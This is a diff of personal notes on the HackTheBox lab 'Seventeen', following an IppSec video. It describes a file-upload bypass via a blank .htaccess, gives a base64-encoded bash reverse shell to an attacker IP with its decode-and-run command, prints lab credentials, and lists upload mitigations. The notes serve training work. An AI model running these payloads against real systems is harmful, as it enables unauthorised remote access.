@@ -4,7 +4,7 @@ Name: Seventeen
 Date:  17/12/2022
 Difficulty: Hard  
 Goals: 
-- Learn different methodolgoical points to assimilate
+- Learn different methodological points to assimilate
 - Get some experienced Blue Team nuggets of knowledge about blue teamery activities
 - Have fun
 - Being that chill for 122 minutes on a Hard box that is probably insane
@@ -13,12 +13,9 @@ Goals:
 Learnt:
 - These are really good for comparitative and iterative "I made X mistake Y months ago - brain reinforced lesson learnt"
 
-
-
-
 Being a detirministically isolated in this wide world and in the cyber world, being that it is Christmas and I am on the enternal get good continuation one way is to learn from other very much unlike yourself. [dadamnmayne](https://www.youtube.com/@dadamnmayne) is awesome and underrated - and very different from myself. He comes from a strong Blue team background, is a manager, has OSCP make stellar content and another awesome [Black Guy at Security Conferences - awesome talk by Joseph McCray](https://www.youtube.com/watch?v=-AkUutmXwUI). I have seen he post some insightful post on THM forums - he is definately someone that will age well. In it also being Christmas and I want a wide scope of methodlogical hows and whys [Can We Root 'Seventeen' from HTB in Under 122 Minutes? | No Writeup Run](https://www.youtube.com/watch?v=u6Bpz7IWYFI), will be both chill and educational. I am poshing through tough weeks stablisers on till I am back at peak to find that next one - this Youtube channel is awesome and very underrated. Tomorrow I will be doing the Snowscan (top 0.9% of HTB on [[Blackfield-Helped-Through]], but tipsy and final starting to feel festive I write to dedicating this written piece to [dadamnmayne](https://www.youtube.com/@dadamnmayne) and his family all the best for the future.  
 
-This is 2.8 box as of writting, this is a nasty box. Respect to Kavighan if you can pass through the new HTB box auditing phase and still agitate the the 456 people that completed this box into rating it so low in 2022. This is not a boxes from 2019 with Windows XP configured to kill brain cells given the insane compatibility with modern exploits, this is the real 2022 box. I am not sure how I am going to feel when I am doing these sorts of boxes in 2024, before during or after  - as unpopular boxes generally are for a specific reason. guessing from the tags, sql, password cracking we may be in for the worst rabbit holes possible (blind sql and weird hash configuration nightmares), in which case praise [dadamnmayne](https://www.youtube.com/@dadamnmayne).
+This is 2.8 box as of writing, this is a nasty box. Respect to Kavighan if you can pass through the new HTB box auditing phase and still agitate the the 456 people that completed this box into rating it so low in 2022. This is not a boxes from 2019 with Windows XP configured to kill brain cells given the insane compatibility with modern exploits, this is the real 2022 box. I am not sure how I am going to feel when I am doing these sorts of boxes in 2024, before during or after  - as unpopular boxes generally are for a specific reason. guessing from the tags, sql, password cracking we may be in for the worst rabbit holes possible (blind sql and weird hash configuration nightmares), in which case praise [dadamnmayne](https://www.youtube.com/@dadamnmayne). **Edit:** Picked the wrong box to follow along with dadamnmayne it will be the  HackTheBox [Json](https://www.youtube.com/watch?v=zqJNOqohWMQ) - see [[Json-Helped-Through]]
 
 For beyond root I want as with prior knowledge of what might be on the box play around with: - 
 - MySQL add some data, do some weird 
@@ -184,9 +181,123 @@ https://www.youtube.com/watch?v=U-2nI6wSPOE&t=46s - 27:12
 Returning to this box again to finish it and state the HackTheBox [Json](https://www.youtube.com/watch?v=zqJNOqohWMQ) helpthrough is going to be my damnmanye understand others Helped-Through as I going to dealing with alot of json related Azure stuff, also found Azure Pentesting from Unknown Artist who seemed to be going through a burnout phase. Regardelss of how rough the alst three months have been as to the expectation I had. I think that really improved in the greater understanding of being a hacker even with the number of boxes or OSCP related triumphs and shortcomings that made my restrategise for Azure System administrator by the and of 2022 and maybe OSCP also. I will see. My progress was made in strife as I have no mentors and I am trying my hardest to use every learning strategy, feedback mechanism and challenge myself for quality time to get results. 
 
 
+![](ippsec-routefilesnotfile.png)
+
+As explained above regarding trying to find a knwon file within a unknown directory structure manually:
+![](ippsecnumfordirthenfile.png)
+
+Ippsec Mitigation 
+- md5sum or shasum the files and store them as the \*-sum string for pseudo random filenames, which remove control over the extension. 
+- Disable PHP wrappers, file could be archived as .zip, but then unzipped PHP wrappers with the extension then useable 
+​- Complexify the suming as function `md5($data_uploaded, $store_id, stud_no, $filename)`
+	- `$data_uploaded`, `$store_id` - like a Salt
+	- `$stud_no`, `$filename` - prevent collision with other files
+
+[Source Code](https://www.sourcecodester.com/php/14155/school-file-management-system.html)
+
+![](ippsecroute-savefilephp.png)
+Create a directory of the stud_no if does not exist and copy file in to the directory
+
+1. Try upload .php file
+2. Proxy in burp and start changing - importantly for myself NOTE THE CHANGES - [[Networked-Helped-Through]], was helped-through because this!
+3. Check any extension is it is getting executed on request to the file in the webserver directory
+
+.htaccess file in Apache can block excution of php 
+1. Upload a blank .htaccess to trick the webserver 
+
+![](useyourownhtaccess.png)
+And we have code execution...Ippsec Rocks!
+![](nvmshellid.png)
+
+Another way would be to change the stud_no, because the .htaccess only would cover a set directory. 
+
+![](burpproblems.png)
+
+It seems like it may have patched out the unintended route... sort of, it is deletign extra directories created, but you can still get a reverse shell. I went back as I remember encoded payload are a must try for me these days. 
+
+Covert to base64 with 0 column wrapping to prevent multi-line base64 string
+```bash
+​￼# Create payload
+echo "/bin/bash -c 'exec bash -i &>/dev/tcp/10.10.14.109/1337 <&1'" | base64 -w0
+​￼# -w0 means wrap 0 columns 
+```
+Decode Payload on target machine:
+```bash
+echo "L2Jpbi9iYXNoIC1jICdleGVjIGJhc2ggLWkgJj4vZGV2L3RjcC8xMC4xMC4xNC4xMDkvMTMzNyA8JjEnCg==" | base64 -d | bash
+```
+
+![](Ihadcreated69and70.png)
+It is probably just a cronjob so you have to do it within a minute interval.
+
+Linux root file system `ls -la` shows we are in a `.dockerenv`
+![](weareinanotherdockercontainer.png)
+
+Went back to the video before doing my own checks just to see if there are more modern ones that have not appeared in THM rooms or Videos or blogs I have read.
+
+![](seemspatched.png)
+They patched the box. The hostname is also indicator of being in docker
+
+Ippsec filesystem knownlegde is awesome, but regardless -
+
+```bash
+find . -type d -name *onf* 2>/dev/null
+find . -type f -name *onf* 2>/dev/null
+grep -r -e require_once
+# Find where it communicates with any databases
+```
+
+To find the process/dbh.php
+![](requireonceanddbhphp.png)
+
+`root : 2020bestyearofmylife`
+
+![](mysqlpassword.png)
+
+`mysqluser : mysqlpassword`
+
+## Mark Shell
+
+![](ohhimark.png)
+
+`mark : 2020bestyearofmylife`
+![](userdottextmark.png)
+
+This is an awesome little 
+```bash
+find / -user $user -ls 2>/dev/null
+```
+
+![](userstofstabtofinduserfile.png)
+With permissions listed
+![](withperms.png)
 
 ## PrivEsc
 
+![](loggertheregistry.png)
+
+Ippsec discusses how the 8000 does to a load balancer, which I had tried to use a a reverse shell, but also why it came up with a 403 forbiudden in the nmap scan
+![](portsandsensemaking.png)
+Because Ippsec saying that 4873 does not make sense to him I decide to go through all the ports, dorking the port I did not know 
+53 - DNS
+80 - http
+8000 - http
+![](loadbalancer8000.png)
+UDP 68 - DHCP/Bootstrap Protocol Client
+[Bootstrap protocol client. Used by client machines to obtain dynamic IP addressing information from a DHCP server.](https://www.speedguide.net/port.php?port=68)Apple NetBoot also uses this port.
+110 - Pop3
+143 - IMAP 
+
+```bash
+~C
+-L 488
+```
+
+[Paused video to continue this for last two and half hours I can justify atm](https://www.youtube.com/watch?v=U-2nI6wSPOE&t=1632s)
+
 ## Beyond Root
+
+
+https://0xdf.gitlab.io/2022/09/24/htb-seventeen.html#box-info
+
 
 
